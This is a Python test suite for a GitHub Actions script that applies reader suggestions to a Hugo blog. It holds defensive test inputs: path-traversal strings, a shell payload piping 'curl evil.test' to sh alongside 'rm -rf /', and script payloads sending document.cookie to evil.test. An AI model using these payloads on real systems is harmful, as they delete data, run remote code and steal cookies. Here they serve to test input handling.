#!/usr/bin/env python3
"""Tests for apply_suggestion.py. Standard library only, so CI needs no install.

Run:  python3 .github/scripts/test_apply_suggestion.py
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
SCRIPT = HERE / "apply_suggestion.py"

sys.path.insert(0, str(HERE))
import apply_suggestion  # noqa: E402  (imported for its constants, not re-run)

POST = """\
---
title: "A Post"
date: 2026-11-03
---

AES-GCM is an authenticated encryption mode. It gives confidentiality and
integrity at once.

The forgery probability is at most (v+1)/2^128 for a blocklength of v.

Encryption alone does not authenticate. Encryption alone does not authenticate.

A sentence with **bold text** and a [link to NIST](https://example.org/sp800) in it.
"""

PAGE = """\
<!doctype html>
<html><head><title>PDAG</title></head>
<body>
<p>
Plain prose can be rewritten.
</p>
<p>
AES &amp; GCM are paired.
</p>
<p>
A sentence with <em>emphasis</em> in it.
</p>
<p>
Let $x^2$ be the bound.
</p>
<p>
Twice said.
</p>
<p>
Twice said.
</p>
<script>
var s = "Hidden in script.";
</script>
<p>
<a title="Hidden in attribute.">x</a>
</p>
<p>
Holds for n &lt; 5.
</p>
</body></html>
"""


def raw_html_problem(repo: Path) -> str:
    """Why Hugo might render raw HTML in posts, or "" if it cannot."""
    import tomllib
    with open(repo / "config.toml", "rb") as fh:
        cfg = tomllib.load(fh)
    unsafe = cfg.get("markup", {}).get("goldmark", {}).get("renderer", {}).get("unsafe")
    if unsafe is True:
        return "config.toml sets markup.goldmark.renderer.unsafe = true"
    # Hugo prefers these over config.toml, and any of them could re-enable it.
    for other in ("hugo.toml", "hugo.yaml", "hugo.yml", "hugo.json",
                  "config.yaml", "config.yml", "config.json", "config"):
        if (repo / other).exists():
            return f"{other} exists, and this check reads only config.toml"
    return ""


def form(**kw) -> str:
    """Render an issue body the way GitHub renders this issue form."""
    order = [
        ("comment", "Comment"),
        ("replacement", "Suggested replacement"),
        ("about", "About you (recommended)"),
        ("source", "Source (recommended if you're correcting a claim)"),
        ("file", "Source file"),
        ("exact", "Selected text"),
        ("prefix", "Preceding context"),
        ("suffix", "Following context"),
    ]
    parts = []
    for key, label in order:
        val = kw.get(key, "")
        parts.append(f"### {label}\n\n{val if val else '_No response_'}\n")
    return "\n".join(parts)


class Harness(unittest.TestCase):
    def setUp(self) -> None:
        self.root = Path(tempfile.mkdtemp(prefix="suggest-test-"))
        (self.root / "content" / "posts").mkdir(parents=True)
        (self.root / "content" / "posts" / "a-post.md").write_text(POST, encoding="utf-8")
        (self.root / "static" / "pdag").mkdir(parents=True)
        (self.root / "static" / "pdag" / "index.html").write_text(PAGE, encoding="utf-8")
        (self.root / "static" / "css").mkdir(parents=True)
        (self.root / "static" / "css" / "site.css").write_text("body{}", encoding="utf-8")
        self.out = self.root / "_out"
        self.gh_out = self.root / "gh_output"
        self.gh_out.write_text("", encoding="utf-8")

    def tearDown(self) -> None:
        shutil.rmtree(self.root, ignore_errors=True)

    def run_script(self, body: str, issue: int = 7, author="reader", author_id="4242"):
        body_file = self.root / "body.txt"
        body_file.write_text(body, encoding="utf-8")
        env = dict(os.environ, GITHUB_OUTPUT=str(self.gh_out))
        proc = subprocess.run(
            [
                sys.executable, "-I", str(SCRIPT),
                "--body-file", str(body_file),
                "--issue", str(issue),
                "--author", author,
                "--author-id", author_id,
                "--repo-root", str(self.root),
                "--out-dir", str(self.out),
            ],
            capture_output=True, text=True, env=env, cwd=str(self.root),
        )
        self.assertEqual(proc.returncode, 0, f"script crashed:\n{proc.stderr}")
        return proc, self.parse_outputs()

    def parse_outputs(self) -> dict[str, str]:
        """Read GITHUB_OUTPUT, honouring the heredoc form."""
        text = self.gh_out.read_text(encoding="utf-8")
        out: dict[str, str] = {}
        lines = text.split("\n")
        i = 0
        while i < len(lines):
            line = lines[i]
            if "<<" in line:
                key, delim = line.split("<<", 1)
                buf = []
                i += 1
                while i < len(lines) and lines[i] != delim:
                    buf.append(lines[i])
                    i += 1
                out[key] = "\n".join(buf)
            elif "=" in line:
                key, _, val = line.partition("=")
                out[key] = val
            i += 1
        return out

    def post_text(self) -> str:
        return (self.root / "content" / "posts" / "a-post.md").read_text(encoding="utf-8")


class TestHappyPaths(Harness):
    def test_replacement_changes_exactly_one_sentence(self):
        _, out = self.run_script(form(
            comment="The bound holds only for the 96-bit IV case.",
            replacement="The forgery probability is at most (v+1)/2^128 for a blocklength of v, assuming a 96-bit IV.",
            file="content/posts/a-post.md",
            exact="The forgery probability is at most (v+1)/2^128 for a blocklength of v.",
        ))
        self.assertEqual(out["status"], "replace")
        after = self.post_text()
        self.assertIn("assuming a 96-bit IV", after)
        # One line differs, and the rest of the file is untouched.
        before_lines, after_lines = POST.split("\n"), after.split("\n")
        differing = [i for i, (a, b) in enumerate(zip(before_lines, after_lines)) if a != b]
        self.assertEqual(len(differing), 1, f"expected a one-line diff, got {differing}")
        self.assertEqual(out["branch"], "suggest/7")
        self.assertIn("Closes #7", Path(out["body_path"]).read_text())

    def test_comment_only_writes_annotation_json(self):
        _, out = self.run_script(form(
            comment="Worth linking the GCM security proof here.",
            file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertEqual(out["status"], "annotate")
        self.assertEqual(out["changed_path"], "static/annotations/posts--a-post.json")
        data = json.loads((self.root / "static/annotations/posts--a-post.json").read_text())
        self.assertEqual(len(data), 1)
        entry = data[0]
        self.assertEqual(entry["exact"], "AES-GCM is an authenticated encryption mode.")
        self.assertEqual(entry["comment"], "Worth linking the GCM security proof here.")
        self.assertEqual(entry["author"], "reader")
        self.assertEqual(entry["issue"], 7)
        self.assertEqual(entry["id"], "s7")
        self.assertRegex(entry["created_at"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        # The source file must not be touched by a comment-only suggestion.
        self.assertEqual(self.post_text(), POST)

    def test_pr_body_links_back_to_the_live_sentence(self):
        (self.root / "config.toml").write_text(
            'baseURL = "https://levduc.github.io/"\n', encoding="utf-8")
        _, out = self.run_script(form(
            comment="A note.", file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        body = Path(out["body_path"]).read_text()
        self.assertIn("https://levduc.github.io/posts/a-post/#:~:text=", body)
        self.assertIn("AES-GCM%20is%20an%20authenticated", body)

    def test_pr_body_omits_the_link_when_no_base_url_is_known(self):
        _, out = self.run_script(form(
            comment="A note.", file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        body = Path(out["body_path"]).read_text()
        self.assertNotIn("#:~:text=", body)
        self.assertNotIn("See it in context", body)

    def test_credit_uses_public_noreply_address(self):
        _, out = self.run_script(form(
            comment="A note.", file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertIn(
            "Co-authored-by: reader <4242+reader@users.noreply.github.com>",
            out["commit_message"],
        )

    def test_bad_login_drops_the_trailer_rather_than_emitting_junk(self):
        _, out = self.run_script(
            form(comment="A note.", file="content/posts/a-post.md",
                 exact="AES-GCM is an authenticated encryption mode."),
            author="not a login; rm -rf /", author_id="nope",
        )
        self.assertNotIn("Co-authored-by", out["commit_message"])

    def test_commit_message_stays_within_the_safe_charset(self):
        # Asserted against the script's own constant so the two cannot drift.
        _, out = self.run_script(form(
            comment="x", file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertRegex(out["commit_message"], apply_suggestion.COMMIT_SAFE_RE)


class TestFuzzyAnchoring(Harness):
    def test_selection_spanning_a_source_line_break(self):
        # In the source this sentence is split across two lines; in the browser
        # the reader selects it as one run of text with a single space.
        _, out = self.run_script(form(
            comment="Tighten this.",
            file="content/posts/a-post.md",
            exact="It gives confidentiality and integrity at once.",
        ))
        self.assertEqual(out["status"], "annotate")
        self.assertEqual(out["anchored_how"], "whitespace-normalised")

    def test_selection_of_rendered_text_containing_markdown(self):
        # The reader sees "bold text" and "link to NIST"; the source has
        # ** ** and [](...) around them.
        _, out = self.run_script(form(
            comment="Reword.",
            file="content/posts/a-post.md",
            exact="A sentence with bold text and a link to NIST in it.",
        ))
        self.assertEqual(out["status"], "annotate")
        self.assertEqual(out["anchored_how"], "markdown-tolerant")

    def test_duplicate_sentence_is_disambiguated_by_context(self):
        _, out = self.run_script(form(
            comment="The second one is redundant.",
            replacement="Encryption alone does not authenticate the message.",
            file="content/posts/a-post.md",
            exact="Encryption alone does not authenticate.",
            prefix="Encryption alone does not authenticate. ",
        ))
        self.assertEqual(out["status"], "replace")
        after = self.post_text()
        # The *second* occurrence was the one replaced.
        self.assertIn(
            "Encryption alone does not authenticate. Encryption alone does not "
            "authenticate the message.",
            after,
        )


class TestRefusals(Harness):
    def assert_manual(self, out, needle: str):
        self.assertEqual(out["status"], "manual")
        self.assertIn(needle.lower(), out["reason"].lower())
        self.assertTrue(Path(out["comment_path"]).is_file())
        for k in ("branch", "pr_title", "body_path"):
            self.assertNotIn(k, out)

    def assert_refused(self, out, needle: str):
        self.assertEqual(out["status"], "not_anchored")
        self.assertIn(needle.lower(), out["reason"].lower())
        self.assertTrue(Path(out["comment_path"]).is_file())
        self.assertEqual(self.post_text(), POST, "a refusal must not modify the source")

    def test_ambiguous_md_rewrite_goes_manual(self):
        _, out = self.run_script(form(
            comment="Which one?",
            replacement="Changed.",
            file="content/posts/a-post.md",
            exact="Encryption alone does not authenticate.",
        ))
        self.assert_manual(out, "appears more than once")
        self.assertEqual(self.post_text(), POST)

    def test_missing_md_rewrite_goes_manual(self):
        _, out = self.run_script(form(
            comment="Not here.",
            replacement="Changed.",
            file="content/posts/a-post.md",
            exact="This sentence is nowhere in the post at all.",
        ))
        self.assert_manual(out, "could not be found")
        self.assertEqual(self.post_text(), POST)

    def test_identical_replacement_is_refused(self):
        _, out = self.run_script(form(
            comment="No change.",
            replacement="AES-GCM is an authenticated encryption mode.",
            file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assert_refused(out, "identical")

    def test_neither_comment_nor_rewrite_is_refused(self):
        _, out = self.run_script(form(
            file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assert_refused(out, "nothing to record")

    def test_comment_optional_when_rewrite_given(self):
        _, out = self.run_script(form(
            replacement="The forgery probability is at most (v+1)/2^128.",
            file="content/posts/a-post.md",
            exact="The forgery probability is at most (v+1)/2^128 for a blocklength of v.",
        ))
        self.assertEqual(out["status"], "replace")

    def test_about_and_source_are_parsed(self):
        f = apply_suggestion.parse_issue_form(form(
            about="Jane Doe, ETH", source="https://doi.org/10.1/x",
            comment="c", file="content/posts/a-post.md", exact="x"))
        self.assertEqual(f["about"], "Jane Doe, ETH")
        self.assertEqual(f["source"], "https://doi.org/10.1/x")

    def _limit(self, **kw):
        base = dict(comment="A note.", file="content/posts/a-post.md",
                    exact="AES-GCM is an authenticated encryption mode.")
        base.update(kw)
        return self.run_script(form(**base))[1]

    def test_oversized_about_is_refused(self):
        out = self._limit(about="a" * 201)
        self.assert_refused(out, "About you")
        self.assertIn("200-character", out["reason"])
        self.assertEqual(self._limit(about="a" * 200)["status"], "annotate")

    def test_oversized_source_is_refused(self):
        out = self._limit(source="a" * 301)
        self.assert_refused(out, "300-character")
        self.assertEqual(self._limit(source="a" * 300)["status"], "annotate")

    def test_comment_limit_is_800(self):
        self.assertEqual(self._limit(comment="a" * 800)["status"], "annotate")
        self.assert_refused(self._limit(comment="a" * 801), "800-character")

    def test_rewrite_limit_is_400(self):
        self.assert_refused(self._limit(replacement="a" * 401), "400-character")

    def test_rewrite_of_400_is_accepted(self):
        self.assertEqual(self._limit(replacement="a" * 400)["status"], "replace")


class TestPageValidation(Harness):
    def fields(self, path):
        return apply_suggestion.parse_issue_form(form(
            comment="c", file=path, exact="Plain prose can be rewritten."))

    def test_form_states_each_limit(self):
        text = (HERE.parent / "ISSUE_TEMPLATE" / "suggest.yml").read_text(encoding="utf-8")
        for n in (800, 400, 200, 300):
            self.assertIn(f"At most {n} characters", text)

    def test_static_page_path_validates(self):
        f, ref = apply_suggestion.validate(self.fields("static/pdag/index.html"), self.root)
        self.assertEqual((ref.kind, ref.page_id), ("page", "pdag"))
        self.assertEqual(f["file"], "static/pdag/index.html")

    def test_non_page_paths_are_refused(self):
        for path in ("layouts/index.html", "static/js/inline-suggest.js", "config.toml"):
            with self.subTest(path=path):
                with self.assertRaises(apply_suggestion.Refused):
                    apply_suggestion.validate(self.fields(path), self.root)

    def test_symlinked_page_is_refused(self):
        (self.root / "static" / "evil").mkdir()
        (self.root / "static" / "evil" / "index.html").symlink_to(
            self.root / "static" / "pdag" / "index.html")
        with self.assertRaises(apply_suggestion.Refused):
            apply_suggestion.validate(self.fields("static/evil/index.html"), self.root)

    def test_symlinked_directory_is_refused(self):
        (self.root / "static" / "evil").symlink_to(self.root / "static" / "pdag")
        with self.assertRaises(apply_suggestion.Refused):
            apply_suggestion.validate(self.fields("static/evil/index.html"), self.root)


class TestMaliciousInput(Harness):
    def assert_refused_path(self, path: str):
        _, out = self.run_script(form(
            comment="Trying it on.", replacement="pwned",
            file=path, exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertEqual(out["status"], "not_anchored", f"{path!r} was not refused")
        self.assertEqual(self.post_text(), POST)
        return out

    def test_path_traversal_variants_are_all_refused(self):
        for path in (
            "../../../../etc/passwd",
            "content/posts/../../../etc/passwd",
            "content/posts/../../config.toml",
            "/etc/passwd",
            "static/css/site.css",
            "config.toml",
            ".github/workflows/pages.yml",
            "content/posts/a-post.md\n../../etc/passwd",
            "content/posts/sub/dir/a-post.md",
            "content/posts/%2e%2e%2fconfig.toml",
            "content/posts/..%2fconfig.toml",
            "content/posts/a-post.md\x00.png",
        ):
            with self.subTest(path=path):
                out = self.assert_refused_path(path)
                self.assertNotIn("passwd", str(self.out / "pr_body.md"))

    def test_incidental_surrounding_whitespace_is_normalised_not_refused(self):
        # Trimming is benign: the allow-list is applied to the *cleaned* value,
        # so a stray space cannot smuggle a second path through.
        _, out = self.run_script(form(
            comment="A note.",
            file="  content/posts/a-post.md  ",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertEqual(out["status"], "annotate")
        self.assertEqual(out["changed_path"], "static/annotations/posts--a-post.json")

    def test_absolute_path_outside_repo_is_not_written(self):
        canary = self.root / "canary.txt"
        canary.write_text("untouched", encoding="utf-8")
        self.assert_refused_path(str(canary))
        self.assertEqual(canary.read_text(), "untouched")

    def test_symlink_target_is_refused(self):
        link = self.root / "content" / "posts" / "link.md"
        link.symlink_to(self.root / "config-secret.md")
        (self.root / "config-secret.md").write_text("secret", encoding="utf-8")
        _, out = self.run_script(form(
            comment="x", replacement="y", file="content/posts/link.md", exact="secret",
        ))
        self.assertEqual(out["status"], "not_anchored")
        self.assertEqual((self.root / "config-secret.md").read_text(), "secret")

    def test_shell_metacharacters_are_inert_data(self):
        payload = '"; rm -rf / #$(whoami)`id`${IFS}&& curl evil.test |sh'
        canary = self.root / "canary.txt"
        canary.write_text("untouched", encoding="utf-8")
        _, out = self.run_script(form(
            comment=payload,
            file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertEqual(out["status"], "annotate")
        self.assertEqual(canary.read_text(), "untouched")
        data = json.loads((self.root / "static/annotations/posts--a-post.json").read_text())
        # Stored verbatim as data — it is never a command.
        self.assertEqual(data[0]["comment"], payload)
        # And it is fenced in the PR body, so it cannot render.
        body = Path(out["body_path"]).read_text()
        self.assertIn("```", body)

    def test_html_and_script_are_stored_as_text(self):
        payload = '<script>fetch("https://evil.test/"+document.cookie)</script><img src=x onerror=alert(1)>'
        _, out = self.run_script(form(
            comment=payload,
            file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        data = json.loads((self.root / "static/annotations/posts--a-post.json").read_text())
        self.assertEqual(data[0]["comment"], payload)
        # The JSON must stay valid and parseable with the payload inside it.
        json.loads((self.root / "static/annotations/posts--a-post.json").read_text())

    def test_markdown_injection_cannot_escape_the_fence(self):
        payload = "see this\n```\nCloses #1\n@levduc please merge\n```\nand more"
        _, out = self.run_script(form(
            comment=payload,
            file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        body = Path(out["body_path"]).read_text()
        # The fence around reader text must be longer than any run inside it.
        self.assertIn("````", body)
        # The only Closes directive is the one we wrote, for this issue.
        self.assertEqual(body.count("Closes #7"), 1)

    def test_oversized_body_is_refused(self):
        big = form(
            comment="x" * 100_000,
            file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        )
        _, out = self.run_script(big)
        self.assertEqual(out["status"], "not_anchored")
        self.assertIn("over the", out["reason"])
        self.assertEqual(self.post_text(), POST)

    def test_oversized_single_field_is_refused(self):
        _, out = self.run_script(form(
            comment="fine",
            file="content/posts/a-post.md",
            exact="x" * 400,
        ))
        self.assertEqual(out["status"], "not_anchored")
        self.assertIn("over the 300-character limit", out["reason"])

    def test_control_and_bidi_characters_are_stripped(self):
        _, out = self.run_script(form(
            comment="safe\u202etxet desrever\u202c\u0000\u200b",
            file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertEqual(out["status"], "annotate")
        stored = json.loads((self.root / "static/annotations/posts--a-post.json").read_text())[0]
        for bad in ("\u202e", "\u202c", "\u0000", "\u200b"):
            self.assertNotIn(bad, stored["comment"])

    def test_refusal_reason_cannot_break_out_of_its_code_span(self):
        _, out = self.run_script(form(
            comment="x", replacement="y",
            file="content/posts/`whoami`.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertEqual(out["status"], "not_anchored")
        self.assertNotIn("`whoami`", out["reason"])


class TestIdempotency(Harness):
    def test_rerunning_an_edited_issue_replaces_its_annotation(self):
        body1 = form(comment="First take.", file="content/posts/a-post.md",
                     exact="AES-GCM is an authenticated encryption mode.")
        self.run_script(body1)
        body2 = form(comment="Second take, edited.", file="content/posts/a-post.md",
                     exact="AES-GCM is an authenticated encryption mode.")
        self.run_script(body2)
        data = json.loads((self.root / "static/annotations/posts--a-post.json").read_text())
        self.assertEqual(len(data), 1, "an edited issue must not duplicate its note")
        self.assertEqual(data[0]["comment"], "Second take, edited.")

    def test_two_different_issues_both_appear(self):
        self.run_script(
            form(comment="From seven.", file="content/posts/a-post.md",
                 exact="AES-GCM is an authenticated encryption mode."),
            issue=7,
        )
        self.run_script(
            form(comment="From eight.", file="content/posts/a-post.md",
                 exact="The forgery probability is at most (v+1)/2^128 for a blocklength of v."),
            issue=8,
        )
        data = json.loads((self.root / "static/annotations/posts--a-post.json").read_text())
        self.assertEqual({a["issue"] for a in data}, {7, 8})

    def test_corrupt_annotation_file_is_refused_not_overwritten(self):
        p = self.root / "static" / "annotations"
        p.mkdir(parents=True)
        (p / "posts--a-post.json").write_text("{not json", encoding="utf-8")
        _, out = self.run_script(form(
            comment="x", file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode.",
        ))
        self.assertEqual(out["status"], "not_anchored")
        self.assertEqual((p / "posts--a-post.json").read_text(), "{not json")



class TestHtmlRewrites(Harness):
    def page_text(self) -> str:
        return (self.root / "static/pdag/index.html").read_text(encoding="utf-8")

    def go(self, exact, replacement, **kw):
        return self.run_script(form(
            comment=kw.get("comment", ""), replacement=replacement,
            file="static/pdag/index.html", exact=exact,
        ))[1]

    def assert_manual(self, out, needle):
        self.assertEqual(out["status"], "manual")
        self.assertIn(needle.lower(), out["reason"].lower())
        for k in ("branch", "pr_title", "body_path"):
            self.assertNotIn(k, out)
        self.assertEqual(self.page_text(), PAGE)

    def test_html_rewrite_changes_only_the_sentence(self):
        new = "Plain prose was rewritten."
        out = self.go("Plain prose can be rewritten.", new)
        self.assertEqual(out["status"], "replace")
        self.assertEqual(self.page_text(), PAGE.replace("Plain prose can be rewritten.", new))
        self.assertEqual(out["pr_title"], "suggestion #7: pdag")

    def test_html_rewrite_is_escaped(self):
        import html.parser
        out = self.go("Plain prose can be rewritten.", 'A <img src=x onerror=alert(1)> & "q".')
        self.assertEqual(out["status"], "replace")
        text = self.page_text()
        self.assertIn("A &lt;img src=x onerror=alert(1)&gt; &amp; &quot;q&quot;.", text)

        tags = []

        class P(html.parser.HTMLParser):
            def handle_starttag(self, tag, attrs):
                tags.append(tag)

        P().feed(text)
        self.assertNotIn("img", tags)

    def test_less_than_in_selection_matches_escaped_source(self):
        out = self.go("Holds for n < 5.", "Holds for n < 6.")
        self.assertEqual(out["status"], "replace")
        self.assertIn("Holds for n &lt; 6.", self.page_text())

    def test_entity_source_matches_unescaped_selection(self):
        out = self.go("AES & GCM are paired.", "AES and GCM are paired.")
        self.assertEqual(out["status"], "replace")
        text = self.page_text()
        self.assertEqual(text, PAGE.replace("AES &amp; GCM are paired.", "AES and GCM are paired."))

    def test_text_only_in_script_or_attribute_is_not_located(self):
        for exact in ("Hidden in script.", "Hidden in attribute."):
            with self.subTest(exact=exact):
                self.assert_manual(self.go(exact, "Changed."), "could not be found")

    def test_span_crossing_markup_goes_manual(self):
        self.assert_manual(self.go("A sentence with emphasis in it.", "Changed."),
                           "crosses formatting")

    def test_span_with_math_goes_manual(self):
        self.assert_manual(self.go("Let $x^2$ be the bound.", "Changed."), "contains math")

    def test_dollar_or_backslash_in_rewrite_goes_manual(self):
        for rep in ("costs $5", "\\alpha bound"):
            with self.subTest(rep=rep):
                self.assert_manual(self.go("Plain prose can be rewritten.", rep), "backslash")
        _, out = self.run_script(form(
            replacement="costs $5", file="content/posts/a-post.md",
            exact="AES-GCM is an authenticated encryption mode."))
        self.assertEqual(out["status"], "manual")
        self.assertEqual(self.post_text(), POST)

    def test_shortcode_braces_in_rewrite_go_manual(self):
        for rep in ("{{< youtube abc >}}", "a {{% vimeo 1 %}} b", "see {{ .Title }}"):
            with self.subTest(rep=rep):
                _, out = self.run_script(form(
                    replacement=rep, file="content/posts/a-post.md",
                    exact="AES-GCM is an authenticated encryption mode."))
                self.assertEqual(out["status"], "manual")
                self.assertIn("{{", out["reason"])
                self.assertEqual(self.post_text(), POST)
                self.assert_manual(self.go("Plain prose can be rewritten.", rep), "{{")

    def test_rewrite_cannot_complete_a_shortcode_with_its_neighbour(self):
        # No "{{" in the rewrite itself, but the "{" before the span would
        # complete one in the file.
        path = self.root / "content" / "posts" / "b-post.md"
        for before, rep, after in (("{{", "< youtube abc >}} gamma.", ""),
                                   ("{", "{< youtube abc >}} gamma.", ""),
                                   ("", "Alpha {", "{< vimeo 1 >}}")):
            src = f"---\ntitle: B\n---\n\nThe set is {before}Alpha beta gamma.{after} here.\n"
            path.write_text(src, encoding="utf-8")
            with self.subTest(before=before, rep=rep, after=after):
                _, out = self.run_script(form(replacement=rep, file="content/posts/b-post.md",
                                              exact="Alpha beta gamma.",
                                              prefix="The set is " + before))
                self.assertEqual(out["status"], "manual", out)
                self.assertEqual(path.read_text(encoding="utf-8"), src)

    def test_ambiguous_html_goes_manual_and_edits_nothing(self):
        self.assert_manual(self.go("Twice said.", "Changed."), "more than once")

    def test_applied_rewrite_adds_no_note(self):
        out = self.go("Plain prose can be rewritten.", "New prose.")
        self.assertEqual(out["status"], "replace")
        ann = self.root / "static" / "annotations"
        self.assertEqual([p for p in ann.glob("*pdag*")] if ann.exists() else [], [])

    def test_manual_comment_has_before_after_line_and_no_pr(self):
        out = self.go("A sentence with emphasis in it.", "Changed.")
        c = Path(out["comment_path"]).read_text()
        self.assertIn("### The text as it stands", c)
        self.assertIn("### Suggested rewrite", c)
        self.assertGreaterEqual(c.count("```"), 4)
        self.assertIn("Nothing has been changed.", c)
        self.assertNotIn("branch", out)
        _, out2 = self.run_script(form(
            comment="x", replacement="Changed.", file="content/posts/a-post.md",
            exact="Encryption alone does not authenticate."))
        c2 = Path(out2["comment_path"]).read_text()
        self.assertNotIn("Line ", c2)

    def test_manual_comment_with_located_span_names_the_line(self):
        out = self.go("Plain prose can be rewritten.", "costs $5")
        c = Path(out["comment_path"]).read_text()
        self.assertIn("Line 5 of `static/pdag/index.html`", c)
        self.assertIn("Plain prose can be rewritten.", c)

    def test_pr_body_for_page_has_line_fences_and_link(self):
        (self.root / "config.toml").write_text('baseURL = "https://levduc.github.io/"\n')
        out = self.go("Plain prose can be rewritten.", "New prose.", comment="Why.")
        body = Path(out["body_path"]).read_text()
        self.assertIn("at line 5 of `static/pdag/index.html`", body)
        # Said once, in the opening sentence, not again on a line of its own.
        self.assertEqual(body.count("ine 5 of `static/pdag/index.html`"), 1)
        self.assertIn("https://levduc.github.io/pdag/#:~:text=", body)
        self.assertIn("### Why", body)
        out = self.go("AES & GCM are paired.", "AES and GCM are paired.")
        self.assertNotIn("### Why", Path(out["body_path"]).read_text())

    def test_markdown_raw_html_stays_disabled(self):
        # Post rewrites are written raw, so posts are safe only while Goldmark
        # omits raw HTML.
        self.assertEqual(raw_html_problem(HERE.parents[1]), "")

    def test_raw_html_check_parses_rather_than_greps(self):
        # "unsafe=true" without spaces slipped past the old string match, as
        # did an unspaced inline table; a hugo.toml beside config.toml takes
        # precedence over it.
        for name, text in (
            ("config.toml", "[markup.goldmark.renderer]\nunsafe=true\n"),
            ("config.toml", "markup={goldmark={renderer={unsafe=true}}}\n"),
            ("hugo.toml", "baseURL = 'x'\n"),
        ):
            with self.subTest(name=name, text=text):
                root = Path(tempfile.mkdtemp(prefix="cfg-"))
                self.addCleanup(shutil.rmtree, root, True)
                (root / "config.toml").write_text('baseURL = "x"\n', encoding="utf-8")
                (root / name).write_text(text, encoding="utf-8")
                self.assertNotEqual(raw_html_problem(root), "")

    def test_zero_width_span_is_not_located(self):
        a = apply_suggestion
        # The only span is the virtual space after <div>, which trims to zero width.
        with self.assertRaises(a.NotLocated) as cm:
            a.find_html_anchor("<div>a</div>", " ", "a", "")
        self.assertIn("could not be found", str(cm.exception))


class TestRewriteCannotBecomeMarkup(Harness):
    """C1: a page rewrite never turns reader text into markup or script."""

    REL = "static/c1/index.html"

    def page(self, body: str) -> str:
        src = f"<!doctype html>\n<html><head><title>C1</title></head>\n<body>\n{body}\n</body></html>\n"
        (self.root / "static" / "c1").mkdir(parents=True, exist_ok=True)
        (self.root / self.REL).write_text(src, encoding="utf-8")
        return src

    def go(self, exact, replacement, prefix=""):
        return self.run_script(form(comment="", replacement=replacement, file=self.REL,
                                    exact=exact, prefix=prefix))[1]

    def assert_manual(self, out, src, needle):
        self.assertEqual(out["status"], "manual", out)
        self.assertIn(needle.lower(), out["reason"].lower())
        self.assertNotIn("body_path", out)
        self.assertEqual((self.root / self.REL).read_text(encoding="utf-8"), src)

    def test_span_right_after_a_literal_lt_goes_manual(self):
        src = self.page("<p>The scheme is secure when n<5 holds for every round.</p>")
        exact, prefix = "5 holds for every round.", "The scheme is secure when n<"
        a = apply_suggestion.find_html_anchor(src, exact, prefix, "")
        self.assertIn("right after", a.blocker)
        out = self.go(exact, "img src=x onerror=alert(document.domain) title=", prefix)
        self.assert_manual(out, src, "right after")

    def test_span_after_a_bogus_end_tag_is_caught_by_the_markup_check(self):
        # Layer 1 sees "/", not "<", before the span; only the structural
        # check stops "</5" turning into the end tag "</p".
        src = self.page("<p>Rated a</5 by most.</p>")
        exact, prefix = "5 by most.", "Rated a</"
        self.assertEqual(apply_suggestion.find_html_anchor(src, exact, prefix, "").blocker, "")
        out = self.go(exact, "p class=x by most.", prefix)
        self.assert_manual(out, src, "markup")
        c = Path(out["comment_path"]).read_text()
        self.assertIn("Line 4 of `static/c1/index.html`", c)

    def test_text_after_a_prefixed_closer_is_still_script(self):
        src = self.page('<p>Intro.</p><script>var s = "</scripts>"; var n = 1;</script>')
        self.assert_manual(self.go("var n = 1;", "var n = alert(document.domain);"), src,
                           "could not be found")

    def test_page_with_comment_in_script_goes_manual(self):
        src = self.page("<p>Plain prose here.</p>\n<script><!--<script>var a = 1;</script>\n"
                        "<p>Visible 1 here.</p>\n</script>")
        for exact, rep in (("Visible 1 here.", "Visible alert(document.domain) here."),
                           ("Plain prose here.", "Plain prose there.")):
            with self.subTest(exact=exact):
                self.assert_manual(self.go(exact, rep), src, "script content")

    def test_self_closing_script_is_still_script(self):
        src = self.page('<p>Intro.</p><script src="a.js"/>var n = 1;</script>')
        self.assert_manual(self.go("var n = 1;", "var n = alert(document.domain);"), src,
                           "could not be found")

    def test_ordinary_rewrite_on_such_a_page_still_applies(self):
        src = self.page("<p>Plain prose here.</p><script>if (a<b) go();</script>")
        out = self.go("Plain prose here.", "Plain prose there.")
        self.assertEqual(out["status"], "replace")
        self.assertEqual((self.root / self.REL).read_text(encoding="utf-8"),
                         src.replace("Plain prose here.", "Plain prose there."))


class TestPageComments(Harness):
    def notes(self, name):
        return json.loads((self.root / "static/annotations" / name).read_text())

    def comment(self, **kw):
        base = dict(comment="A note.", file="static/pdag/index.html",
                    exact="Plain prose can be rewritten.")
        base.update(kw)
        return self.run_script(form(**base))[1]

    def test_comment_on_page_writes_page_notes_file(self):
        out = self.comment()
        self.assertEqual(out["status"], "annotate")
        self.assertEqual(out["changed_path"], "static/annotations/pdag.json")
        self.assertEqual(len(self.notes("pdag.json")), 1)
        self.assertEqual(out["pr_title"], "suggestion #7: pdag")
        self.assertEqual((self.root / "static/pdag/index.html").read_text(), PAGE)

    def test_comment_on_math_or_script_text_still_publishes(self):
        out = self.comment(exact="x2 be the bound")
        self.assertEqual(out["status"], "annotate")
        self.assertIn("Not found in the source", Path(out["body_path"]).read_text())

    def test_found_comment_names_the_line(self):
        out = self.comment()
        self.assertIn("Found at line 5 of `static/pdag/index.html`",
                      Path(out["body_path"]).read_text())

    def test_post_notes_use_posts_prefix(self):
        out = self.comment(file="content/posts/a-post.md",
